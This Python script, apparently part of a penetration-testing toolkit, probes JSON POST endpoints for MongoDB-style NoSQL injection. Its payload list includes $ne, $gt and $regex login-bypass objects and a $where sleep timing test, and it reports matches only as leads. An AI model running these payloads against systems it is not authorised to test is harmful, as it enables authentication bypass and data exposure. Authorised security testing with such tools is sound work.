#!/usr/bin/env python
"""nosql_probe.py — NoSQL injection tester (NoSQLMap-style).

Tests NoSQL injection (MongoDB/CouchDB/Firebase) via JSON OPERATOR-OBJECT
injection ($ne, $gt, $regex, $where, $exists, $in) in JSON-bodied POST
endpoints. The operator must reach the query as a nested object, not as a quoted
string — so the payload is parsed with json.loads and embedded as a real value.

Signals (each a LEAD, never "confirmed"):
  * boolean: an operator object flips a failed auth (baseline 4xx) into a 2xx,
    or yields a materially different body at the same status;
  * timing: a $where sleep delays the response past the baseline.
A signal is necessary, not sufficient — the value could differ for benign
reasons, so this emits a LEAD; the verifier confirms exploitability.
See .claude/rules/evidence-standard.md (disposition vocabulary) and pitfalls.md.

Usage: python nosql_probe.py <url> [--param user] [--concurrency 4]
"""
import argparse, concurrent.futures, json, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _http import post

# (label, JSON payload, description). Each payload is valid JSON and is injected
# as a real object/value (an operator object for the boolean/timing tests).
PAYLOADS = [
    ("ne_bypass",   '{"$ne": null}',                      "not-equal bypass (returns all docs)"),
    ("ne_empty",    '{"$ne": ""}',                        "not-equal bypass (non-empty)"),
    ("gt_bypass",   '{"$gt": ""}',                        "greater-than bypass"),
    ("regex_all",   '{"$regex": ".*"}',                   "regex match-all"),
    ("exists_true", '{"$exists": true}',                  "exists true"),
    ("where_taut",  '{"$where": "1==1"}',                 "$where tautology"),
    ("where_sleep", '{"$where": "sleep(3000)"}',          "$where timing (3s delay)"),
    ("in_array",    '{"$in": ["admin","root","user"]}',   "$in operator"),
]
DELAY_S = 2.5


def test(url, param, payload_str, desc):
    val = json.loads(payload_str)  # FIX: real object/value, not a quoted string
    body = json.dumps({param: val}).encode()
    r = post(url, data=body, headers={"Content-Type": "application/json"}, timeout=30)
    out = {"desc": desc, "payload": payload_str, "time_s": round(r.elapsed, 2),
           "delayed": r.elapsed > DELAY_S}
    if r.error:
        out["error"] = r.error
        return out
    out.update({"status": r.status, "resp_len": len(r.text), "resp_snippet": r.text[:150]})
    return out


def is_lead(r, baseline_len, baseline_status):
    """A boolean/timing operator-injection signal (LEAD, not a confirmation)."""
    if r.get("delayed"):
        return True
    st = r.get("status")
    if st is None:
        return False
    # boolean: operator object flipped a failed auth into a success
    if baseline_status >= 400 and 200 <= st < 300:
        return True
    # boolean: same status, materially different body
    if st == baseline_status and abs(r.get("resp_len", 0) - baseline_len) > 50:
        return True
    return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="JSON POST endpoint (e.g. /api/login)")
    ap.add_argument("--param", default="username", help="JSON field to inject into")
    ap.add_argument("--concurrency", type=int, default=4)
    args = ap.parse_args()

    # baseline (benign string value)
    base = post(args.url, data=json.dumps({args.param: "redan_benign"}).encode(),
                headers={"Content-Type": "application/json"}, timeout=15)
    baseline_len = 0 if base.error else len(base.text)
    baseline_status = 0 if base.error else base.status

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(test, args.url, args.param, p[1], p[2]): p[0] for p in PAYLOADS}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            r["label"] = futures[fut]
            r["baseline_len"] = baseline_len
            r["baseline_status"] = baseline_status
            results.append(r)
    results.sort(key=lambda x: x.get("time_s", 0), reverse=True)
    leads = [r for r in results if is_lead(r, baseline_len, baseline_status)]
    print(json.dumps({
        "tool": "nosql_probe", "target": args.url, "param": args.param, "ok": True,
        "baseline_len": baseline_len, "baseline_status": baseline_status,
        "payloads_tested": len(results), "signals": len(leads),
        "disposition": "lead" if leads else "none",
        "verdict": ("NoSQL injection LEAD — boolean/timing operator-injection signal "
                    "(verify exploitability)") if leads else "no NoSQL injection signal",
        "results": results, "lead_details": leads,
        "note": "A >=2.5s delay = $where timing; a 4xx->2xx flip or a >50B body delta at the "
                "same status = boolean signal. LEAD only — the verifier confirms exploitability. "
                "Test on JSON POST endpoints."}, indent=2))


if __name__ == "__main__":
    main()
